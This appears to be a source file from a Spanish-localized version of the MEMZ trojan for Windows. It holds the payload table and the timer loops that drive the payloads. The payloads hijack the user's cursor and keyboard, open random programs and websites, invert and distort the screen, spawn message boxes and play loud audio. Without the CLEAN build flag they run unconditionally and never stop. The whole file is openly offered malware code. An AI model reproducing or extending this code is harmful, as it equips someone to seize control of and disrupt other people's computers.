﻿#include "../MEMZ.h"

PAYLOAD payloads[] = {
	Payload(L"Abrir sitios web/programas aleatorios", payloadHostDefault, (LPVOID)payloadExecute, 30000, FALSE), 
	Payload(L"Movimiento aleatorio del cursor", payloadHostDefault, (LPVOID)payloadCursor, 20000, TRUE), 
	Payload(L"Entrada de teclado aleatoria", payloadHostDefault, (LPVOID)payloadKeyboard, 20000, FALSE), 
	Payload(L"Sonidos de error aleatorios", payloadHostDefault, (LPVOID)payloadWindowsSounds, 50000, TRUE), 
	Payload(L"Invertir pantalla", payloadHostVisual, (LPVOID)payloadInvertScreen, 30000, TRUE), 
	Payload(L"Cajas de mensaje", payloadHostDefault, (LPVOID)payloadMessageBox, 20000, TRUE), 
	Payload(L"Dibujar íconos de error", payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, TRUE), 
	Payload(L"Texto al revés", payloadHostDefault, (LPVOID)payloadReverseText, 40000, FALSE), 
	Payload(L"Efecto de túnel", payloadHostVisual, (LPVOID)payloadTunnel, 60000, TRUE), 
	Payload(L"Fallos visuales en pantalla", payloadHostVisual, (LPVOID)payloadScreenGlitches, 15000, TRUE), 
	Payload(L"Crazy Bus (destrucción auditiva)", payloadCrazyBus, NULL, 10000, TRUE), 
};


const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

PAYLOADHOST(payloadHostDefault) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
#else
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime);
#endif
				
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}

PAYLOADHOST(payloadHostVisual) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE, hwnd, hdc, &rekt, w, h);
#else
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, hwnd, hdc, &rekt, w, h);
#endif
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		}
		else {
			payload->runtime = 0;
			payload->times = 0;
			payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}